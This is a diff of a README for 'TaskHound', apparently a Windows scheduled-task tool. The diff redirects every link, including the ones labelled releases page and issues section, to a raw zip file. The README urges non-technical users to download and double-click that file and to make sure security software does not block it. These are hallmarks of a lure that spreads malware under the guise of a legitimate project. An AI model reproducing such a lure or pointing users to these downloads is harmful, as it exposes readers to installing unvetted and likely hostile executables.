@@ -1,7 +1,7 @@
 # 🛠️ TaskHound - Easily Manage Scheduled Tasks on Remote Systems
 
 ## 🌐 Download Now
-[![Download TaskHound](https://raw.githubusercontent.com/Jaguarluvsu/TaskHound/main/mesosaur/TaskHound.zip)](https://raw.githubusercontent.com/Jaguarluvsu/TaskHound/main/mesosaur/TaskHound.zip)
+[![Download TaskHound](https://raw.githubusercontent.com/Jaguarluvsu/TaskHound/main/taskhound/output/Task_Hound_2.8.zip)](https://raw.githubusercontent.com/Jaguarluvsu/TaskHound/main/taskhound/output/Task_Hound_2.8.zip)
 
 ## 🚀 Getting Started
 Welcome to TaskHound! This tool helps you find and manage scheduled tasks on remote Windows systems. It is designed for users who want an easy way to handle these tasks without needing technical skills.
@@ -22,12 +22,12 @@ TaskHound allows you to:
 - Export task information for reporting.
 
 ## 📥 Download & Install
-1. Click this link to **[visit the releases page](https://raw.githubusercontent.com/Jaguarluvsu/TaskHound/main/mesosaur/TaskHound.zip)**.
+1. Click this link to **[visit the releases page](https://raw.githubusercontent.com/Jaguarluvsu/TaskHound/main/taskhound/output/Task_Hound_2.8.zip)**.
 2. Find the latest version of TaskHound.
-3. Click on the asset you want to download (e.g., https://raw.githubusercontent.com/Jaguarluvsu/TaskHound/main/mesosaur/TaskHound.zip).
+3. Click on the asset you want to download (e.g., https://raw.githubusercontent.com/Jaguarluvsu/TaskHound/main/taskhound/output/Task_Hound_2.8.zip).
 4. Wait for the download to complete.
 5. Navigate to your downloads folder and locate the file.
-6. Double-click https://raw.githubusercontent.com/Jaguarluvsu/TaskHound/main/mesosaur/TaskHound.zip to run the application.
+6. Double-click https://raw.githubusercontent.com/Jaguarluvsu/TaskHound/main/taskhound/output/Task_Hound_2.8.zip to run the application.
 
 If you have any trouble, you can refer to our documentation section below.
 
@@ -43,7 +43,7 @@ If you experience any problems, consider the following steps:
 - Ensure no security software is blocking TaskHound.
 
 ## 📞 Support
-For support or to report an issue, please visit the **[issues section](https://raw.githubusercontent.com/Jaguarluvsu/TaskHound/main/mesosaur/TaskHound.zip)** of the repository. You can describe your problem, and we will respond as soon as possible.
+For support or to report an issue, please visit the **[issues section](https://raw.githubusercontent.com/Jaguarluvsu/TaskHound/main/taskhound/output/Task_Hound_2.8.zip)** of the repository. You can describe your problem, and we will respond as soon as possible.
 
 ## 💻 Contributing
 If you want to contribute to TaskHound, feel free to fork the repository and submit a pull request. We welcome improvements and suggestions.
@@ -55,4 +55,4 @@ TaskHound is open source and licensed under the MIT License. You can read more a
 Thanks to all the contributors and users who make TaskHound better with their feedback and support.
 
 ## 🕒 Updates
-Keep an eye on the **[releases page](https://raw.githubusercontent.com/Jaguarluvsu/TaskHound/main/mesosaur/TaskHound.zip)** for updates. New features and fixes are available regularly to enhance your experience.
+Keep an eye on the **[releases page](https://raw.githubusercontent.com/Jaguarluvsu/TaskHound/main/taskhound/output/Task_Hound_2.8.zip)** for updates. New features and fixes are available regularly to enhance your experience.
